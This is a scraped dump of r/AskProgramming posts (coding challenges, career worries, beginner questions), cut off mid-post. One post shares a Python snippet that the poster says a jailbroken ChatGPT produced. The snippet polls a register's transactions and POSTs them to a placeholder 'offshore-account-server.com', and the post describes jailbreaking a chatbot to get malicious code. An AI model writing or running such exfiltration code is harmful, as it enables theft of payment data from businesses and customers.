+<p>The program must receive a list of words from standard input, one word per line.</p>
+
+<p>It should return the longest sequence of words, where the next word in the sequence starts with the last letter of the previous word.</p>
+
+<p>There cannot be repeated words in the sequence. Also no repeated words in the input</p>
+
+<p>The string must be returned to standard output, one word per line.</p>
+
+<p>The program must know how to deal with uppercase/lowercase letters. Uppercase letters are the same as lowercase letters.</p>
+
+<p>The program cannot use either libraries or external services.</p>
+
+<p>The program must be written in Java, C or Python.</p>
+
+<p>I have tried using chatgpt but it keeps giving me wrong outputs for harder tests.</p>
+
+<p>Edit: Provided 4 tests in the comments</p>
+
+<p>Edit2: Forgot to say  there&#39;s only 30 seconds to execute and a limit of 150Mb of memory to use</p>
+
+<p>&#x200B;</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,11ekdp2,True,6,True,all_ads,False,False,/r/AskProgramming/comments/11ekdp2/coding_challenge_going_around_in_my_university/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/11ekdp2/coding_challenge_going_around_in_my_university/,93779,1677619397.0,0,False,False
+2048,confidence,"I asked a jailbroken version of chatgpt to give me some malicious code and got this as a result, can someone translate, the jailbroken version can bullshit most of the time, so I wasn't even sure this could be remotely malicious
+
+&#x200B;
+
+ import requests import threading  # Replace with the URL of the offshore account server offshore\_server\_url = 'http://offshore-account-server.com' def sniff\_transactions():     # Replace with the URL of the register     register\_url = 'http://register.com/transactions' while True:         # Request the transactions from the register         response = requests.get(register\_url)         transactions = response.json()          # Reroute the transactions to the offshore account server         requests.post(offshore\_server\_url, json=transactions)  def main():     # Start a new thread to sniff transactions in the background     transaction\_sniffer = threading.Thread(target=sniff\_transactions)     transaction\_sniffer.start()  if \_\_name\_\_ == '\_\_main\_\_':     main()",t2_olqi2lx7,False,0,False,I'm curious about what this actually made,r/AskProgramming,False,6,,0,False,t3_112qk8i,False,dark,0.4,public,0,0,False,False,False,Python,False,0,False,False,self,0.0,,True,1676439363.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I asked a jailbroken version of chatgpt to give me some malicious code and got this as a result, can someone translate, the jailbroken version can bullshit most of the time, so I wasn&#39;t even sure this could be remotely malicious</p>
+
+<p>&#x200B;</p>
+
+<p>import requests import threading  # Replace with the URL of the offshore account server offshore_server_url = &#39;<a href=""http://offshore-account-server.com"">http://offshore-account-server.com</a>&#39; def sniff_transactions():     # Replace with the URL of the register     register_url = &#39;<a href=""http://register.com/transactions"">http://register.com/transactions</a>&#39; while True:         # Request the transactions from the register         response = requests.get(register_url)         transactions = response.json()          # Reroute the transactions to the offshore account server         requests.post(offshore_server_url, json=transactions)  def main():     # Start a new thread to sniff transactions in the background     transaction_sniffer = threading.Thread(target=sniff_transactions)     transaction_sniffer.start()  if __name__ == &#39;__main__&#39;:     main()</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,1f58cf08-356a-11ec-ad2f-4e9b0284a14c,False,False,False,False,t5_2seko,False,,112qk8i,True,7,True,all_ads,False,False,/r/AskProgramming/comments/112qk8i/im_curious_about_what_this_actually_made/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/112qk8i/im_curious_about_what_this_actually_made/,93779,1676439363.0,0,False,False
+2048,confidence,"Everywhere I go I just get bombarded with the message ""Have exceptional projects in your resume to land good internships"", but what actually is an exceptional project, is that website resume that every other aspiring full stack developer has,
+
+Or the Python chatbot, Or the tic tac toe, or another crappy website.
+
+I just want to really know what would be actually an exceptional project
+
+""Please be considerate of the fact that I'm still a student and am willing to put in the effort to learn new things, but suggesting to make the next ChatGPT, DALL E, or the next Facebook is pretty out of bounds for me ATM""",t2_55rygyli,False,0,False,Projects! Projects! Projects!,r/AskProgramming,False,6,,0,False,t3_zymy2h,False,dark,0.5,public,0,0,False,False,False,Career/Edu,False,0,False,False,self,0.0,,True,1672363519.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Everywhere I go I just get bombarded with the message &quot;Have exceptional projects in your resume to land good internships&quot;, but what actually is an exceptional project, is that website resume that every other aspiring full stack developer has,</p>
+
+<p>Or the Python chatbot, Or the tic tac toe, or another crappy website.</p>
+
+<p>I just want to really know what would be actually an exceptional project</p>
+
+<p>&quot;Please be considerate of the fact that I&#39;m still a student and am willing to put in the effort to learn new things, but suggesting to make the next ChatGPT, DALL E, or the next Facebook is pretty out of bounds for me ATM&quot;</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,17095c1e-cc05-11e2-9f3d-12313d2c1c24,False,False,False,False,t5_2seko,False,,zymy2h,True,6,True,all_ads,False,False,/r/AskProgramming/comments/zymy2h/projects_projects_projects/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zymy2h/projects_projects_projects/,93779,1672363519.0,0,False,False
+2048,confidence,"For example,  
+
+
+I have
+
+    food = ['apple', 'turkey', 'green beans']
+    categories = {
+        'fruit'=[],
+        'meat'=[],
+        'vegetables'=[],
+    }
+
+and I want
+
+    categories = {
+        'fruit':['apple'],
+        'meat':['turkey'],
+        'vegetables':['green beans']
+    }
+
+
+I tried to use chatGPT, but it only worked for small lists and dictionaries. It may be something I'm doing incorrectly though. Is my best bet just to pay someone?",t2_c4n4d,False,0,False,Is there a good tool or service to categorize words?,r/AskProgramming,False,6,,0,False,t3_102q5pk,False,dark,0.67,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1672796129.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>For example,  </p>
+
+<p>I have</p>
+
+<pre><code>food = [&#39;apple&#39;, &#39;turkey&#39;, &#39;green beans&#39;]
+categories = {
+    &#39;fruit&#39;=[],
+    &#39;meat&#39;=[],
+    &#39;vegetables&#39;=[],
+}
+</code></pre>
+
+<p>and I want</p>
+
+<pre><code>categories = {
+    &#39;fruit&#39;:[&#39;apple&#39;],
+    &#39;meat&#39;:[&#39;turkey&#39;],
+    &#39;vegetables&#39;:[&#39;green beans&#39;]
+}
+</code></pre>
+
+<p>I tried to use chatGPT, but it only worked for small lists and dictionaries. It may be something I&#39;m doing incorrectly though. Is my best bet just to pay someone?</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,102q5pk,True,3,True,all_ads,False,False,/r/AskProgramming/comments/102q5pk/is_there_a_good_tool_or_service_to_categorize/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/102q5pk/is_there_a_good_tool_or_service_to_categorize/,93779,1672796129.0,0,False,False
+2048,confidence,"Hello fellow redditors, really appreciate anyone taking the time to respond.
+
+In a nutshell, I've worked in a variety of roles that were data analytics adjacent (tools, cloud, data structures, and sql), but more on the business side than the technical side, so think strategy and planning, IT analytics, or just general tech consulting. However, I have needed to close the gap on learning real programming, especially since I'd like to keep working remote and dev work always seems to be at the top of remote opportunities. 
+  
+
+Having been laid off last year, I took a break, and then joined an immersive fullstack boot camp (thanks uncle sam and US taxpayers).  The boot camp is a well known one, but my cohort is a fucking nightmare filled with numerous set up issues, lack of preparation, shallow instruction, waving off student concerns and questions, and generally just useful for the canned content (which they hardly use but is actually decent) and the projects.  Lecture is a complete waste and it's the internet and chatgpt teaching me. Not everyone is shit at the job, but the best lecturer isn't the main one, so we don't get a ton of time with them. 
+  
+
+We have hit a point in the class where things are starting to rev up, we blazed through databases and servers at a pace that almost makes no sense. We reviewed everything from the previous weeks the week prior to the one we covered servers and databases, which covered vanilla JS, CSS, HTML, DOM, and debugging. It helped a little, but then it accelerated without any improvement in the instruction. We're covering React very soon.
+  
+
+My question is, how the f**k do I catch up and not feel so overwhelmed?   And succeed despite them?    9 out of 10 times it feels like going to class and doing group or pair work is a waste of my time.  I'd rather just work alone than potentially get stuck with a dipshit who cheated their way to our level and makes me carry all the weight or worse, teach them some shit that was their and the instructor's responsibility.
+  
+
+I've got decent handling of the stuff we reviewed, but have fallen behind due to tech issues during an exam. We blazed so quickly through stuff like promises and asynchronous functions, etc etc.  that I'm worried I won't be able to catch up or even better, get ahead of the class.
+  
+
+Any suggestions?  I can't drop at this point without being indebted, so I have to finish. But I feel set up for failure and having to work double the amount that other cohorts have had to (based on chats with students ahead of us). I've seen some of their content and their cohort instructors did a WAY better job than those teaching us now. It's pathetic how much it costs given the shit quality. And I know for certain there are many in it whole feel like me. I can't move to a new boot camp or cohort because of my timeline though.",t2_5viywtpk,False,0,False,"Mid-career professional pivoting toward full stack and data analytics programming -- Hellish boot camp, need advice",r/AskProgramming,False,6,,0,False,t3_10pzled,False,dark,0.67,public,2,0,False,False,False,,False,2,False,False,self,1675174163.0,,True,1675173163.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hello fellow redditors, really appreciate anyone taking the time to respond.</p>
+
+<p>In a nutshell, I&#39;ve worked in a variety of roles that were data analytics adjacent (tools, cloud, data structures, and sql), but more on the business side than the technical side, so think strategy and planning, IT analytics, or just general tech consulting. However, I have needed to close the gap on learning real programming, especially since I&#39;d like to keep working remote and dev work always seems to be at the top of remote opportunities. </p>
+
+<p>Having been laid off last year, I took a break, and then joined an immersive fullstack boot camp (thanks uncle sam and US taxpayers).  The boot camp is a well known one, but my cohort is a fucking nightmare filled with numerous set up issues, lack of preparation, shallow instruction, waving off student concerns and questions, and generally just useful for the canned content (which they hardly use but is actually decent) and the projects.  Lecture is a complete waste and it&#39;s the internet and chatgpt teaching me. Not everyone is shit at the job, but the best lecturer isn&#39;t the main one, so we don&#39;t get a ton of time with them. </p>
+
+<p>We have hit a point in the class where things are starting to rev up, we blazed through databases and servers at a pace that almost makes no sense. We reviewed everything from the previous weeks the week prior to the one we covered servers and databases, which covered vanilla JS, CSS, HTML, DOM, and debugging. It helped a little, but then it accelerated without any improvement in the instruction. We&#39;re covering React very soon.</p>
+
+<p>My question is, how the f**k do I catch up and not feel so overwhelmed?   And succeed despite them?    9 out of 10 times it feels like going to class and doing group or pair work is a waste of my time.  I&#39;d rather just work alone than potentially get stuck with a dipshit who cheated their way to our level and makes me carry all the weight or worse, teach them some shit that was their and the instructor&#39;s responsibility.</p>
+
+<p>I&#39;ve got decent handling of the stuff we reviewed, but have fallen behind due to tech issues during an exam. We blazed so quickly through stuff like promises and asynchronous functions, etc etc.  that I&#39;m worried I won&#39;t be able to catch up or even better, get ahead of the class.</p>
+
+<p>Any suggestions?  I can&#39;t drop at this point without being indebted, so I have to finish. But I feel set up for failure and having to work double the amount that other cohorts have had to (based on chats with students ahead of us). I&#39;ve seen some of their content and their cohort instructors did a WAY better job than those teaching us now. It&#39;s pathetic how much it costs given the shit quality. And I know for certain there are many in it whole feel like me. I can&#39;t move to a new boot camp or cohort because of my timeline though.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,10pzled,True,4,True,all_ads,False,False,/r/AskProgramming/comments/10pzled/midcareer_professional_pivoting_toward_full_stack/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10pzled/midcareer_professional_pivoting_toward_full_stack/,93779,1675173163.0,0,False,False
+2048,confidence,"I recently started learning ML on the side of my regular job to future proof myself. I'm currently a private tutor.
+
+After seeing ChatGPT, I'm feeling like there's no point. Maybe I should simply just accept that the big companies will be the ones who create generalised AI and anything I do will be so tiny in comparison that I'd be better off just enjoying life and accepting that I'll be part of the population who consumes AI not creates it
+
+Thoughts",t2_gr8r5,False,0,False,Is it still worth learning ML?,r/AskProgramming,False,6,,0,False,t3_zhrcg4,False,dark,0.33,public,0,0,False,False,False,,False,0,False,False,self,0.0,,True,1670675200.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I recently started learning ML on the side of my regular job to future proof myself. I&#39;m currently a private tutor.</p>
+
+<p>After seeing ChatGPT, I&#39;m feeling like there&#39;s no point. Maybe I should simply just accept that the big companies will be the ones who create generalised AI and anything I do will be so tiny in comparison that I&#39;d be better off just enjoying life and accepting that I&#39;ll be part of the population who consumes AI not creates it</p>
+
+<p>Thoughts</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,zhrcg4,True,6,True,all_ads,False,False,/r/AskProgramming/comments/zhrcg4/is_it_still_worth_learning_ml/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zhrcg4/is_it_still_worth_learning_ml/,93779,1670675200.0,0,False,False
+2048,confidence,"So we are supposed to implement some real life application of data structures for our college DS course. We just started learning about stacks, queues, LLs, graphs. 
+
+So I thought of a problem where there are multiple friends living in diff parts of the city, and they are trying to find a theater which is convenient for all of them, not too far or too close to anyone(u  get what i mean i hope)  
+I hope to implement graphs, djikstra, and priority queues(at least that's what chatgpt said i needed to use).  
+Do you think this is a task of sufficient difficulty for college level?  
+and is it a problem that needs solving?",t2_mt3sf74l,False,0,False,Question regarding data structures,r/AskProgramming,False,6,,0,False,t3_10pzu1u,False,dark,1.0,public,1,0,False,False,False,,False,1,False,False,self,0.0,,True,1675173760.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>So we are supposed to implement some real life application of data structures for our college DS course. We just started learning about stacks, queues, LLs, graphs. </p>
+
+<p>So I thought of a problem where there are multiple friends living in diff parts of the city, and they are trying to find a theater which is convenient for all of them, not too far or too close to anyone(u  get what i mean i hope)<br/>
+I hope to implement graphs, djikstra, and priority queues(at least that&#39;s what chatgpt said i needed to use).<br/>
+Do you think this is a task of sufficient difficulty for college level?<br/>
+and is it a problem that needs solving?</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,10pzu1u,True,1,True,all_ads,False,False,/r/AskProgramming/comments/10pzu1u/question_regarding_data_structures/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10pzu1u/question_regarding_data_structures/,93779,1675173760.0,0,False,False
+2048,confidence,"I have like no real knowledge on this topic but a lot of questions so please dont go at me too much. Im an engineering student and was considering choosing computer science next semester, but this chatgpt thing has me wondering.
+
+- I understand its still not good enough to produce code to replace programmers, but doesnt it make entry level programmers kind of screwed?
+
+- I would graduate in about 4 years and cant it advance much by then?
+
+- I also saw people talking about how it cant replicate the full ideas people have, but cant people just break it down into easy parts and get the ai to code. Then tweak it a little to be perfect?",t2_6nkzxmrr,False,0,False,Ai replacing programmers,r/AskProgramming,False,6,,0,False,t3_zscj6c,False,dark,0.47,public,0,0,False,False,False,,False,0,False,False,self,0.0,,True,1671684449.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I have like no real knowledge on this topic but a lot of questions so please dont go at me too much. Im an engineering student and was considering choosing computer science next semester, but this chatgpt thing has me wondering.</p>
+
+<ul>
+<li><p>I understand its still not good enough to produce code to replace programmers, but doesnt it make entry level programmers kind of screwed?</p></li>
+<li><p>I would graduate in about 4 years and cant it advance much by then?</p></li>
+<li><p>I also saw people talking about how it cant replicate the full ideas people have, but cant people just break it down into easy parts and get the ai to code. Then tweak it a little to be perfect?</p></li>
+</ul>
+</div><!-- SC_ON -->",False,True,False,False,False,False,,False,False,False,False,t5_2seko,False,,zscj6c,True,22,True,all_ads,False,False,/r/AskProgramming/comments/zscj6c/ai_replacing_programmers/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zscj6c/ai_replacing_programmers/,93779,1671684449.0,0,False,False
+2048,confidence,"I feel very betrayed, because I have 100+ reputation and only 10 questions over about 5 years. Out of those 10 questions about half of them got downvoted, rest is okay.
+
+I know I'm supposed to improve my questions first and foremost however in most cases my question was rather generic, not something that could be answered with a quality answer.
+
+Even if I do improve the question, I don't understand how that makes a difference since even my newest question is from May. Does the system automatically use some AI to check if it complies with sitewide rules every time I update a question?
+
+I already elaborated on one question where it was possible however nothing changed. The system is truly frustrating and frankly stupid, considering that it ignores your contribution in answers.",t2_12u48q,False,0,False,I got banned from asking questions on StackOverflow. What should I do? Anybody faced the same issue?,r/AskProgramming,False,6,,0,False,t3_zokhtq,False,dark,0.62,public,5,0,False,False,False,Other,False,5,False,False,self,0.0,,True,1671322091.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I feel very betrayed, because I have 100+ reputation and only 10 questions over about 5 years. Out of those 10 questions about half of them got downvoted, rest is okay.</p>
+
+<p>I know I&#39;m supposed to improve my questions first and foremost however in most cases my question was rather generic, not something that could be answered with a quality answer.</p>
+
+<p>Even if I do improve the question, I don&#39;t understand how that makes a difference since even my newest question is from May. Does the system automatically use some AI to check if it complies with sitewide rules every time I update a question?</p>
+
+<p>I already elaborated on one question where it was possible however nothing changed. The system is truly frustrating and frankly stupid, considering that it ignores your contribution in answers.</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,zokhtq,True,22,True,all_ads,False,False,/r/AskProgramming/comments/zokhtq/i_got_banned_from_asking_questions_on/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zokhtq/i_got_banned_from_asking_questions_on/,93779,1671322091.0,0,False,False
+2048,confidence,"I want to learn programming. I buy all of these books, watch all of these tutorials, and do all of these practice exercises, but mostly I never learn how to do anything. I learn a lot about it, but I can't actually do it. 
+
+I feel like the disconnect is related to not being able to stick with a schedule well enough to teach myself things, but I can with other priorities, like paid or free college or professional development courses, even if they're online. I don't know what the difference is here, except maybe I feel like since it's free or community based, I'm not learning anything important because the course is probably incomplete, so I don't put in a lot of effort or see a lot of return.   
+
+
+Whatever it is, though, I really need to get out of it. Programming in this day and age is an essential skill, like being able to read or do math. I need to know how to do this to keep my skills relevant and up-to-date.",t2_e06rkpv,False,0,False,"Does anyone know of any free resources that walk you through the project steps like you're taking a class? I cannot teach myself, and I'm not sure what the disconnect is.",r/AskProgramming,False,6,,0,False,t3_zu1xd5,False,dark,0.75,public,2,0,False,False,False,Other,False,2,False,False,self,0.0,,True,1671857014.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I want to learn programming. I buy all of these books, watch all of these tutorials, and do all of these practice exercises, but mostly I never learn how to do anything. I learn a lot about it, but I can&#39;t actually do it. </p>
+
+<p>I feel like the disconnect is related to not being able to stick with a schedule well enough to teach myself things, but I can with other priorities, like paid or free college or professional development courses, even if they&#39;re online. I don&#39;t know what the difference is here, except maybe I feel like since it&#39;s free or community based, I&#39;m not learning anything important because the course is probably incomplete, so I don&#39;t put in a lot of effort or see a lot of return.   </p>
+
+<p>Whatever it is, though, I really need to get out of it. Programming in this day and age is an essential skill, like being able to read or do math. I need to know how to do this to keep my skills relevant and up-to-date.</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,zu1xd5,True,9,True,all_ads,False,False,/r/AskProgramming/comments/zu1xd5/does_anyone_know_of_any_free_resources_that_walk/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/zu1xd5/does_anyone_know_of_any_free_resources_that_walk/,93779,1671857014.0,0,False,False
+2048,confidence,"For the past few weeks using Google to work has been very frustrating, it ignores search parameters and the results are filled with scam websites that scrape Stack Overflow.
+
+I am tired of having to add double quotes everywhere to force it to use the words I just pasted and adding _tabnine_, _stackoverflow_, _reddit_ or _github_ to my queries and still getting a bunch of trash in the first results.
+
+What are you using for programming work?",t2_5thr6,False,0,False,Google has turned into trash: what are you using?,r/AskProgramming,False,6,,0,False,t3_11c0a6j,False,dark,0.57,public,3,0,False,False,False,Other,False,3,False,False,self,0.0,,True,1677370732.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>For the past few weeks using Google to work has been very frustrating, it ignores search parameters and the results are filled with scam websites that scrape Stack Overflow.</p>
+
+<p>I am tired of having to add double quotes everywhere to force it to use the words I just pasted and adding <em>tabnine</em>, <em>stackoverflow</em>, <em>reddit</em> or <em>github</em> to my queries and still getting a bunch of trash in the first results.</p>
+
+<p>What are you using for programming work?</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,11c0a6j,True,14,True,all_ads,False,False,/r/AskProgramming/comments/11c0a6j/google_has_turned_into_trash_what_are_you_using/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/11c0a6j/google_has_turned_into_trash_what_are_you_using/,93779,1677370732.0,0,False,False
+2048,confidence,"So I got this idea for a website/program that I would greatly need and I suppose others would too but I have a problem. I have very limited coding knowledge and very much still learning the basics so I have no idea on how to even start this or even google the materials. 
+
+It would be a website that would have 10-20 text boxes that you could type in the numbers between 1-20 and based on the typed numbers and in which box they are placed in it would show a specific info text. That's the basic idea.
+
+So if Text box 1 is ""5"" and Text Box 7 is ""13"" and the rest are ""10"" then it says ""X""
+
+And if Text Box 3 is ""9"" and Text Box 6 is ""17"" and the rest are ""9"" then it says ""Y""
+
+I have no idea how to do this and I'm having troubles finding help on google. 
+
+Thanks.",t2_5gscwv32,False,0,False,Hello everyone! Your help is greatly appreciated.,r/AskProgramming,False,6,,0,False,t3_11cmaw3,False,dark,1.0,public,2,0,False,False,False,,False,2,False,False,self,0.0,,True,1677430801.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>So I got this idea for a website/program that I would greatly need and I suppose others would too but I have a problem. I have very limited coding knowledge and very much still learning the basics so I have no idea on how to even start this or even google the materials. </p>
+
+<p>It would be a website that would have 10-20 text boxes that you could type in the numbers between 1-20 and based on the typed numbers and in which box they are placed in it would show a specific info text. That&#39;s the basic idea.</p>
+
+<p>So if Text box 1 is &quot;5&quot; and Text Box 7 is &quot;13&quot; and the rest are &quot;10&quot; then it says &quot;X&quot;</p>
+
+<p>And if Text Box 3 is &quot;9&quot; and Text Box 6 is &quot;17&quot; and the rest are &quot;9&quot; then it says &quot;Y&quot;</p>
+
+<p>I have no idea how to do this and I&#39;m having troubles finding help on google. </p>
+
+<p>Thanks.</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,11cmaw3,True,15,True,all_ads,False,False,/r/AskProgramming/comments/11cmaw3/hello_everyone_your_help_is_greatly_appreciated/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/11cmaw3/hello_everyone_your_help_is_greatly_appreciated/,93779,1677430801.0,0,False,False
+2048,confidence,I’ve seen that this is a super common issue in programming communities and it’s driving me nuts as well. Because software is an endless well of things to learn and it always feels like I know nothing no matter what I build,t2_3u226bfv,False,0,False,Imposter syndrome! How do you get over it?,r/AskProgramming,False,6,,0,False,t3_113g36m,False,dark,0.63,public,4,0,False,False,False,Other,False,4,False,False,self,0.0,,True,1676515872.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I’ve seen that this is a super common issue in programming communities and it’s driving me nuts as well. Because software is an endless well of things to learn and it always feels like I know nothing no matter what I build</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,113g36m,True,18,False,all_ads,False,False,/r/AskProgramming/comments/113g36m/imposter_syndrome_how_do_you_get_over_it/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/113g36m/imposter_syndrome_how_do_you_get_over_it/,93779,1676515872.0,0,False,False
+2048,confidence,"Just as the title says. I'm interested in automated testing, and I thought I'd ask what people here like in terms of tools, approaches (like TDD) and other things.",t2_pr6s3wl8,False,0,False,What's your favorite part of unit testing?,r/AskProgramming,False,6,,0,False,t3_10sra2i,False,dark,0.83,public,17,0,False,False,False,Python,False,17,False,False,self,0.0,,True,1675448579.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Just as the title says. I&#39;m interested in automated testing, and I thought I&#39;d ask what people here like in terms of tools, approaches (like TDD) and other things.</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,1f58cf08-356a-11ec-ad2f-4e9b0284a14c,False,False,False,False,t5_2seko,False,,10sra2i,True,20,True,all_ads,False,False,/r/AskProgramming/comments/10sra2i/whats_your_favorite_part_of_unit_testing/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10sra2i/whats_your_favorite_part_of_unit_testing/,93779,1675448579.0,0,False,False
+2048,confidence,"I always see people say that Rails and Django aren’t good for large scale projects, and are better suited for small stuff.
+
+Is it because of the project structure? Just trying to understand what makes something like SpringBoot or ASP scale better than those two",t2_7k601t9z,False,0,False,What makes a backend framework scalable?,r/AskProgramming,False,6,,0,False,t3_10xl36o,False,dark,0.87,public,11,0,False,False,False,Architecture,False,11,False,False,self,0.0,,True,1675916185.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I always see people say that Rails and Django aren’t good for large scale projects, and are better suited for small stuff.</p>
+
+<p>Is it because of the project structure? Just trying to understand what makes something like SpringBoot or ASP scale better than those two</p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,f67af7ae-356a-11ec-b0a8-669d3354ae18,False,False,False,False,t5_2seko,False,,10xl36o,True,13,True,all_ads,False,False,/r/AskProgramming/comments/10xl36o/what_makes_a_backend_framework_scalable/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10xl36o/what_makes_a_backend_framework_scalable/,93779,1675916185.0,0,False,False
+2048,confidence,[This](https://i.imgur.com/XxhGNO8.png),t2_ojb3oyf,False,0,False,"I'm actually an amateur in programming. Can you tell me how to write this popular meme code efficiently, please?",r/AskProgramming,False,6,,0,False,t3_10jslm9,False,dark,0.81,public,20,0,False,False,False,,False,20,False,True,self,0.0,self,True,1674520883.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p><a href=""https://i.imgur.com/XxhGNO8.png"">This</a></p>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,10jslm9,True,18,True,all_ads,False,False,/r/AskProgramming/comments/10jslm9/im_actually_an_amateur_in_programming_can_you/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10jslm9/im_actually_an_amateur_in_programming_can_you/,93779,1674520883.0,0,False,False
+2048,confidence," I know the code copies the content of src and inserts it in dest. But what's the role of buffer? Is it an intermediate variable used to pass the content?
+
+    char buffer[LEN]; 
+    ifstream src(srcFile, ios::in | ios::binary); 
+    ofstream dest(destFile, ios::out | ios::binary);  
+    while (!src.eof()) {   
+       src.read(buffer, LEN);
+       dest.write(buffer, src.gcount()); 
+    }",t2_36i4y1pi,False,0,False,What is the role of buffer?,r/AskProgramming,False,6,,0,False,t3_10pwaq6,False,dark,0.99,public,7,0,False,False,False,,False,7,False,False,self,0.0,,True,1675163129.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>I know the code copies the content of src and inserts it in dest. But what&#39;s the role of buffer? Is it an intermediate variable used to pass the content?</p>
+
+<pre><code>char buffer[LEN]; 
+ifstream src(srcFile, ios::in | ios::binary); 
+ofstream dest(destFile, ios::out | ios::binary);  
+while (!src.eof()) {   
+   src.read(buffer, LEN);
+   dest.write(buffer, src.gcount()); 
+}
+</code></pre>
+</div><!-- SC_ON -->",False,False,False,False,False,False,,False,False,False,False,t5_2seko,False,,10pwaq6,True,12,True,all_ads,False,False,/r/AskProgramming/comments/10pwaq6/what_is_the_role_of_buffer/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/10pwaq6/what_is_the_role_of_buffer/,93779,1675163129.0,0,False,False
+2048,confidence,"For context, I have VERY minimal coding experience (MATLAB back in university + high school HTML) but I do have a basic understanding of how to create code - practically just following instructions / proper syntax for each language or Googling similar code. So apologies for this question.
+
+What I don't know is how you implement/package your code for day-to-day use. Like do you upload it somewhere and they 'run' it for you? Like do I pay for a service to keep it there? For example, I want to input raw data on meeting details and have the program give me a formatted version where it identifies key information. I have the code but no idea how to run it lmao. 
+
+I've had this question for years and I don't know what topic to look up. I want to learn more because there are tasks in my job that I think can be automated.",t2_uhq09l8y,False,0,False,How do you set up working programs?,r/AskProgramming,False,6,,0,False,t3_118grf5,False,dark,0.5,public,0,0,False,False,False,Other,False,0,False,False,self,0.0,,True,1677017691.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>For context, I have VERY minimal coding experience (MATLAB back in university + high school HTML) but I do have a basic understanding of how to create code - practically just following instructions / proper syntax for each language or Googling similar code. So apologies for this question.</p>
+
+<p>What I don&#39;t know is how you implement/package your code for day-to-day use. Like do you upload it somewhere and they &#39;run&#39; it for you? Like do I pay for a service to keep it there? For example, I want to input raw data on meeting details and have the program give me a formatted version where it identifies key information. I have the code but no idea how to run it lmao. </p>
+
+<p>I&#39;ve had this question for years and I don&#39;t know what topic to look up. I want to learn more because there are tasks in my job that I think can be automated.</p>
+</div><!-- SC_ON -->",False,True,False,False,False,False,608ebc8a-356a-11ec-81a1-c205767038e0,False,False,False,False,t5_2seko,False,,118grf5,True,4,True,all_ads,False,False,/r/AskProgramming/comments/118grf5/how_do_you_set_up_working_programs/,all_ads,False,https://www.reddit.com/r/AskProgramming/comments/118grf5/how_do_you_set_up_working_programs/,93779,1677017691.0,0,False,False
+2048,confidence," Hello. ""New"" programmer here. Been programming in a C++, C# and JAVA, but that's already not a truth. I wanna get back in programming, perhaps with different language.
+
+Anyways, I'm a volunteer fireman and I'm kind of a newbie but I want to be better as a programmer and also as a fireman. So I thought, what if I (with some help of others) made for me, and some who want, this ""Quiz"". Perhaps in Windows forms, so I can use images.
+
+Anyone mind helping a bit with this? Haven't programmed for a while now and I don't want to search forums for something I can get answer In seconds and at the right thing I need
+
